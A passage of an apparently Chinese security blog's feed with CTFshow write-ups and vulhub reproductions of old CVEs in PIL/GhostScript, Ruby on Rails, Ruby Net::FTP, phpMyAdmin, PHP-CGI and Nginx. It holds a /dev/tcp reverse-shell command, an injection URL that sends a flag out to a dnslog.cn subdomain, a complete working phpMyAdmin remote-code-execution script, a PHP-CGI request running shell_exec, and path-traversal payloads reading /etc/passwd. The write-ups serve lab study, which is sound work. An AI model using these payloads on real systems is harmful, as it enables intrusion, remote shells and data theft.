）<br>Python中处理图片的模块PIL（Pillow），因为其内部调用了GhostScript而受到GhostButt漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。</p><p>可以看到有一个上传页面。正常功能是我们上传一个PNG文件，后端调用PIL加载图片，输出长宽。但我们可以将可执行命令EPS文件后缀改成PNG进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。</p><p>比如<a href="https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png">poc.png</a>，我们上传之，即可执行touch /tmp/aaaaa。将POC中的命令改为反弹命令(bash -c “bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1”)，即可获得shell：<br><img src="https://z3.ax1x.com/2021/06/18/Rpnatg.png"></p><h1><span id="web597">WEB597</span></h1><p>Ruby On Rails 路径穿越漏洞（CVE-2018-3760）<br>Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。</p><p>Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。</p><p>直接访问IP/assets/file:%2f%2f/etc/passwd，将会报错，因为文件/etc/passwd不在允许的目录中：<br><img src="https://z3.ax1x.com/2021/06/18/RpM9k8.png"><br>在上方的报错中随意选择一个路径利用../返回上一级，成功实现任意文件读取<br><img src="https://z3.ax1x.com/2021/06/18/RpMSTf.png"></p><h1><span id="web598">WEB598</span></h1><p>Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）</p><p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入<code>Accept: ../../../../../../../../etc/passwd&#123;&#123;</code>头来构成构造路径穿越漏洞，读取任意文件。</p><p>访问/robots并抓包传入Accept<br><img src="https://z3.ax1x.com/2021/06/18/RplnWF.png"></p><h1><span id="web599">WEB599</span></h1><p>Ruby Net::FTP 模块命令注入漏洞（CVE-2017-17405）<br>这一题做的时间比较久，一直反弹不出来，最后向bit师傅学到了一个新的姿势</p><p>因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装pyftpdlib</span><br><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line"># 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口</span><br><span class="line">python3 -m pyftpdlib -p 2121 -i 0.0.0.0</span><br></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/06/18/Rp8Goq.png" alt="Rp8Goq.png"><br>然后即可开始利用漏洞。发送如下数据包即可（填上你的FTP服务器的ip和端口，空格要用${IFS}代替，使用前先在<a href="http://dnslog.cn/">dnslog.cn</a>创建一个子域名用来接收数据(替换下面的子域名)）：</p><p><code>IP/download?uri=ftp://FTPIP:FTPPORT/&amp;file=|ping$&#123;IFS&#125;$FLAG.qfy4pq.dnslog.cn$&#123;IFS&#125;-c$&#123;IFS&#125;2</code><br>观察ftp服务器，收到数据包<br><img src="https://z3.ax1x.com/2021/06/18/Rp8YF0.png" alt="Rp8YF0.png"><br>dnslog收到数据<br><img src="https://z3.ax1x.com/2021/06/18/Rp8tYV.png" alt="Rp8tYV.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web580&quot;&gt;WEB580&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web581&quot;&gt;WEB581&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web582&quot;&gt;WEB582&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a </summary>
      
    
    
    
    <category term="WP" scheme="https://lewiserii.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://lewiserii.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-群友挑战-wp</title>
    <link href="https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
    <id>https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</id>
    <published>2021-06-16T04:00:00.000Z</published>
    <updated>2021-06-17T02:15:37.043Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ctfshow福利抽奖">CTFshow福利抽奖</span></h1><p>好家伙，打开容器就是flag，但是群主把提交的框隐藏了<br><img src="https://z3.ax1x.com/2021/06/17/2jWeDx.md.png"></p><p>观察URL中的数字，发现这一题的value是1089<br><img src="https://z3.ax1x.com/2021/06/17/2jWEvR.png"></p><p>打开其他任意一题，修改challenge-id的value值，提交成功<br><img src="https://z3.ax1x.com/2021/06/17/2jWZK1.md.png"></p><h1><span id="富婆我来了">富婆我来了</span></h1><p>根据提示，在群文件下载文件<br><img src="https://z3.ax1x.com/2021/06/17/2jWA29.md.png"></p><p>将附件内容与群文件内容一一对应，找到中文即可</p><blockquote><p>214,1—&gt;我<br>221,7—&gt;也<br>233,35—&gt;想<br>15,45—&gt;找<br>65,67—&gt;三<br>57,37—&gt;十<br>115,27—&gt;六<br>229,8—&gt;迪<br>232,27—&gt;的<br>101,48—&gt;富<br>124,94—&gt;婆</p></blockquote><h1><span id="病毒我来了">病毒我来了</span></h1><p>解压后直接用010或者strings可以看到flag就在最后，不过是16进制的，转成字符串即可</p><h1><span id="fw我来了">FW我来了</span></h1><p>notepad++或其他编辑器打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[&#123;000214A0-0000-0000-C000-000000000046&#125;]</span><br><span class="line">Prop3=19,2</span><br><span class="line">[InternetShortcut]</span><br><span class="line">Modified=63746673686f777b666c61675f69735f6c6f76657d</span><br><span class="line">IconFile=C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">IconIndex=10</span><br><span class="line">IDList=</span><br><span class="line">URL=https://ctf.show/</span><br></pre></td></tr></table></figure><p>将modified的值转字符串即可</p><h1><span id="损坏的文件">损坏的文件</span></h1><p>stegsolve一把梭，另存为png文件，flag就在图片上<br><img src="https://z3.ax1x.com/2021/06/17/2jWk8J.md.png"></p><p>未完待续。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ctfshow福利抽奖&quot;&gt;CTFshow福利抽奖&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;好家伙，打开容器就是flag，但是群主把提交的框隐藏了&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/17/2jWeDx.md.png&quot;&gt;</summary>
      
    
    
    
    <category term="WP" scheme="https://lewiserii.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://lewiserii.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</title>
    <link href="https://lewiserii.github.io/2021/06/12/CVE-2016-5734/"/>
    <id>https://lewiserii.github.io/2021/06/12/CVE-2016-5734/</id>
    <published>2021-06-12T04:00:00.000Z</published>
    <updated>2021-06-17T02:17:12.890Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="0x01-漏洞简介">0x01 漏洞简介</span></h1><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。</p><p>在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><h1><span id="0x02-影响版本">0x02 影响版本</span></h1><p>4.0.10.16之前4.0.x版本<br>4.4.15.7之前4.4.x版本<br>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）<br>Php 5.0 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p><h1><span id="0x03-漏洞复现">0x03 漏洞复现</span></h1><p>采用vulhub搭建<br>直接运行POC：</p><p>python poc.py -u root -p “root” URL -c “system(‘cat /etc/passwd’)”</p><p><img src="https://z3.ax1x.com/2021/06/17/2jWP5F.md.png"></p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span><br><span class="line">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span><br><span class="line">CVE: CVE-2016-5734</span><br><span class="line">Author: https://twitter.com/iamsecurity</span><br><span class="line">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">__author__ = &quot;@iamsecurity&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;url&quot;, type=str, help=&quot;URL with path to PMA&quot;)</span><br><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, type=str, help=&quot;PHP command(s) to eval()&quot;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--user&quot;, required=True, type=str, help=&quot;Valid PMA user&quot;)</span><br><span class="line">    parser.add_argument(&quot;-p&quot;, &quot;--pwd&quot;, required=True, type=str, help=&quot;Password for valid PMA user&quot;)</span><br><span class="line">    parser.add_argument(&quot;-d&quot;, &quot;--dbs&quot;, type=str, help=&quot;Existing database at a server&quot;)</span><br><span class="line">    parser.add_argument(&quot;-T&quot;, &quot;--table&quot;, type=str, help=&quot;Custom table name for exploit.&quot;)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    if arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    else:</span><br><span class="line">        db = &quot;test&quot;</span><br><span class="line">    token = False</span><br><span class="line">    custom_table = False</span><br><span class="line">    if arguments.table:</span><br><span class="line">        custom_table = True</span><br><span class="line">        table = arguments.table</span><br><span class="line">    else:</span><br><span class="line">        table = &quot;prgpwn&quot;</span><br><span class="line">    if arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    else:</span><br><span class="line">        payload = &quot;system(&#x27;uname -a&#x27;);&quot;</span><br><span class="line"></span><br><span class="line">    size = 32</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    # you can manually add proxy support it&#x27;s very simple ;)</span><br><span class="line">    # s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    s.verify = False</span><br><span class="line">    sql = &#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span><br><span class="line">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span><br><span class="line">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span><br><span class="line">    &#x27;&#x27;&#x27;.format(table)</span><br><span class="line"></span><br><span class="line">    # get_token</span><br><span class="line">    resp = s.post(url_to_pma + &quot;/?lang=en&quot;, dict(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    if resp.status_code is 200:</span><br><span class="line">        token_place = resp.text.find(&quot;token=&quot;) + 6</span><br><span class="line">        token = resp.text[token_place:token_place + 32]</span><br><span class="line">    if token is False:</span><br><span class="line">        print(&quot;Cannot get valid authorization token.&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    if custom_table is False:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;is_js_confirmed&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;db&quot;: db,</span><br><span class="line">            &quot;token&quot;: token,</span><br><span class="line">            &quot;pos&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;sql_query&quot;: sql,</span><br><span class="line">            &quot;sql_delimiter&quot;: &quot;;&quot;,</span><br><span class="line">            &quot;show_query&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;fk_checks&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;SQL&quot;: &quot;Go&quot;,</span><br><span class="line">            &quot;ajax_request&quot;: &quot;true&quot;,</span><br><span class="line">            &quot;ajax_page_request&quot;: &quot;true&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + &quot;/import.php&quot;, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        if resp.status_code == 200:</span><br><span class="line">            if &quot;success&quot; in resp.json():</span><br><span class="line">                if resp.json()[&quot;success&quot;] is False:</span><br><span class="line">                    first = resp.json()[&quot;error&quot;][resp.json()[&quot;error&quot;].find(&quot;&lt;code&gt;&quot;)+6:]</span><br><span class="line">                    error = first[:first.find(&quot;&lt;/code&gt;&quot;)]</span><br><span class="line">                    if &quot;already exists&quot; in error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;ERROR: &quot; + error)</span><br><span class="line">                        sys.exit(1)</span><br><span class="line">    # build exploit</span><br><span class="line">    exploit = &#123;</span><br><span class="line">        &quot;db&quot;: db,</span><br><span class="line">        &quot;table&quot;: table,</span><br><span class="line">        &quot;token&quot;: token,</span><br><span class="line">        &quot;goto&quot;: &quot;sql.php&quot;,</span><br><span class="line">        &quot;find&quot;: &quot;0/e\0&quot;,</span><br><span class="line">        &quot;replaceWith&quot;: payload,</span><br><span class="line">        &quot;columnIndex&quot;: &quot;0&quot;,</span><br><span class="line">        &quot;useRegex&quot;: &quot;on&quot;,</span><br><span class="line">        &quot;submit&quot;: &quot;Go&quot;,</span><br><span class="line">        &quot;ajax_request&quot;: &quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + &quot;/tbl_find_replace.php&quot;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    if resp.status_code == 200:</span><br><span class="line">        result = resp.json()[&quot;message&quot;][resp.json()[&quot;message&quot;].find(&quot;&lt;/a&gt;&quot;)+8:]</span><br><span class="line">        if len(result):</span><br><span class="line">            print(&quot;result: &quot; + result)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        print(</span><br><span class="line">            &quot;Exploit failed!\n&quot;</span><br><span class="line">            &quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span><br><span class="line">            &quot;Remember that servers with PHP version greater than 5.4.6&quot;</span><br><span class="line">            &quot; is not exploitable, because of warning about null byte in regexp&quot;</span><br><span class="line">        )</span><br><span class="line">        sys.exit(1)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;0x01-漏洞简介&quot;&gt;0x01 漏洞简介&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。&lt;/p&gt;
&lt;p&gt;在</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</title>
    <link href="https://lewiserii.github.io/2021/06/11/CVE-2012-1823/"/>
    <id>https://lewiserii.github.io/2021/06/11/CVE-2012-1823/</id>
    <published>2021-06-11T04:00:00.000Z</published>
    <updated>2021-06-12T07:34:52.465Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="0x01-漏洞说明">0x01 漏洞说明</span></h1><p>漏洞影响版本<br>php &lt; 5.3.12 or php &lt; 5.4.2<br>CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p><h1><span id="0x02-漏洞成因">0x02 漏洞成因</span></h1><p>这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。</p><p>RFC3875中规定，当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。所以Apache服务器按要求实现了这个功能。但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。但开发者是为了方便使用类似#!/usr/local/bin/php-cgi -d include_path=/path的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。</p><p>于是，源程序中的if(!cgi) getopt(…)被删掉了。</p><p>根据RFC中对于command line的说明，命令行参数不光可以通过#!/usr/local/bin/php-cgi -d include_path=/path的方式传入php-cgi，更可以通过querystring的方式传入。</p><h1><span id="0x02-漏洞复现">0x02 漏洞复现</span></h1><ul><li>CGI模式下的参数：<ul><li>-c 指定php.ini文件的位置</li><li>-n 不要加载php.ini文件</li><li>-d 指定配置项</li><li>-b 启动fastcgi进程</li><li>-s 显示文件源码</li><li>-T 执行指定次该文件</li><li>-h和-？ 显示帮助</li></ul></li></ul><p>访问 URL/index.php?-s ，爆出源码，说明漏洞存在。发送如下数据包，可见Body中的代码已被执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60c2e316c77be.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;0x01-漏洞说明&quot;&gt;0x01 漏洞说明&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;漏洞影响版本&lt;br&gt;php &amp;lt; 5.3.12 or php &amp;lt; 5.4.2&lt;br&gt;CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
    <link href="https://lewiserii.github.io/2021/06/11/CVE-2013-4547/"/>
    <id>https://lewiserii.github.io/2021/06/11/CVE-2013-4547/</id>
    <published>2021-06-11T04:00:00.000Z</published>
    <updated>2021-06-17T02:16:56.717Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="0x01-漏洞简介">0x01 漏洞简介</span></h1><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，</p><p>错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p><p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。而存在</p><p>CVE-2013-4547的情况下，我们请求 1.gif[0x20][0x00].php ，这个URI可以匹配上正则 .php$，</p><p>可以进入这个Location块；但进入后，由于fastcgi在查找文件时被\0截断，Nginx却错误地认为</p><p>请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。</p><p>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。</p><p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p><p>再举个例子，比如很多网站限制了允许访问后台的IP：</p><p>location /admin/ {<br>    allow 127.0.0.1;<br>    deny all;<br>}<br>我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，</p><p>也就绕过了其中的IP验证；但最后请求的是 /test[0x20]/../admin/index.php 文件，也就是/admin/index.php，</p><p>成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，</p><p>则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p><p>简单来说就是我们构造：<a href="http://127.0.0.1/test.aaa">http://127.0.0.1/test.aaa</a> \0bbb</p><p>让Nginx认为文件“file.aaa ”的后缀为“.bbb”。</p><h1><span id="0x02-影响版本">0x02 影响版本</span></h1><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><h1><span id="0x03-漏洞复现">0x03 漏洞复现</span></h1><p>我们上传一个1.txt，注意后面的空格：</p><p><img src="https://z3.ax1x.com/2021/06/17/2jWCUU.md.png"></p><p>访问URL/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析：</p><p><img src="https://z3.ax1x.com/2021/06/17/2jW9ET.png"></p><p><img src="https://z3.ax1x.com/2021/06/17/2jWFC4.md.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;0x01-漏洞简介&quot;&gt;0x01 漏洞简介&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，&lt;/p&gt;
&lt;p&gt;错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。&lt;/p&gt;
&lt;p&gt;举个例子</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
</feed>
